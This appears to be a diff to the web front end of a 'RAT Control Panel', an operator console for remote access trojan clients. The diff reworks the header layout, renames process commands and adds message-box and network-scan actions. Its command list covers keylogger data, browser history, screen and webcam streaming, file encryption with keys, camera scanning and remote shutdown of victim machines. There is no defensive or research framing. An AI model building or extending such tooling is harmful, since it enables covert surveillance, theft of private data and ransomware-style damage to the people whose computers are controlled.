@@ -99,13 +99,6 @@
       }
     }
     
-    .connection-indicator {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      z-index: 1000;
-    }
-    
     .notifications-container {
       position: fixed;
       top: 80px;
@@ -153,13 +146,6 @@
   </style>
 </head>
 <body class="text-gray-100 min-h-screen">
-  <!-- Connection Status Indicator -->
-  <div id="connection-indicator" class="connection-indicator">
-    <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
-      <i class="fas fa-wifi mr-2"></i>Connecting...
-    </div>
-  </div>
-
   <!-- Login Overlay -->
   <div id="login-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
     <div class="glass-effect rounded-2xl p-8 w-full max-w-md mx-4">
@@ -226,23 +212,26 @@
     <!-- Main Panel -->
     <div class="flex-1 flex flex-col">
       <!-- Header -->
-      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
-        <div class="flex items-center justify-between">
-          <div>
-            <h1 class="text-2xl font-bold text-white">RAT Control Panel</h1>
-            <p class="text-gray-300 text-sm">Selected Clients: <span id="selected-count">0</span></p>
+      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700 flex items-center justify-between">
+        <div>
+          <h1 class="text-2xl font-bold text-white">RAT Control Panel</h1>
+          <p class="text-gray-300 text-sm">Selected Clients: <span id="selected-count">0</span></p>
+        </div>
+        <div class="flex items-center gap-4">
+          <div id="connection-indicator" class="mr-4">
+            <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
+              <i class="fas fa-wifi mr-2"></i>Connecting...
+            </div>
           </div>
-          <div class="flex items-center gap-4">
-            <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
-              <i class="fas fa-chart-bar mr-2"></i>Server Stats
-            </button>
-            <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
-              <i class="fas fa-trash mr-2"></i>Clear
-            </button>
-            <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
-              <i class="fas fa-download mr-2"></i>Export
-            </button>
-          </div>
+          <button id="server-stats-btn" class="bg-indigo-600 hover:bg-indigo-700 text-white px-4 py-2 rounded-lg transition duration-200">
+            <i class="fas fa-chart-bar mr-2"></i>Server Stats
+          </button>
+          <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
+            <i class="fas fa-trash mr-2"></i>Clear
+          </button>
+          <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
+            <i class="fas fa-download mr-2"></i>Export
+          </button>
         </div>
       </div>
 
@@ -280,11 +269,14 @@
           <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
             <i class="fas fa-folder mr-1"></i>List Files
           </button>
-          <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/process_list">
+          <button class="quick-action bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ps">
             <i class="fas fa-tasks mr-1"></i>Processes
           </button>
           <button class="quick-action bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_info">
-            <i class="fas fa-network-wired mr-1"></i>Network
+            <i class="fas fa-network-wired mr-1"></i>Network Info
+          </button>
+          <button class="quick-action bg-cyan-600 hover:bg-cyan-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/network_scan">
+            <i class="fas fa-search-location mr-1"></i>Scan Network
           </button>
           <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
             <i class="fas fa-desktop mr-1"></i>Screen Stream
@@ -423,6 +415,9 @@
       { cmd: '/systeminfo', desc: 'Show system information' },
       { cmd: '/history', desc: 'Show browser history' },
       { cmd: '/keylogger', desc: 'Show keylogger data' },
+      { cmd: '/ps', desc: 'Show running processes' },
+      { cmd: '/kill', desc: 'Kill process by PID' },
+      { cmd: '/msgbox', desc: 'Show a message box on the client' },
       { cmd: '/screenstream_start', desc: 'Start screen streaming' },
       { cmd: '/screenstream_stop', desc: 'Stop screen streaming' },
       { cmd: '/webcam_start', desc: 'Start webcam stream' },
@@ -430,8 +425,6 @@
       { cmd: '/encrypt', desc: 'Encrypt files/folders' },
       { cmd: '/decrypt', desc: 'Decrypt files/folders' },
       { cmd: '/scan_cameras', desc: 'Scan for network cameras' },
-      { cmd: '/process_list', desc: 'Show running processes' },
-      { cmd: '/kill_process', desc: 'Kill process by PID' },
       { cmd: '/network_info', desc: 'Show network information' },
       { cmd: '/network_scan', desc: 'Scan network for hosts' },
       { cmd: '/shutdown', desc: 'Shutdown system' },
@@ -1103,8 +1096,11 @@
             result.key_hex = pathAndKey[1];
           }
           break;
-        case 'kill_process':
+        case 'kill':
           result.pid = args;
+          break;
+        case 'msgbox':
+          result.text = args;
           break;
         case 'network_scan':
           result.range = args || '192.168.1.0/24';
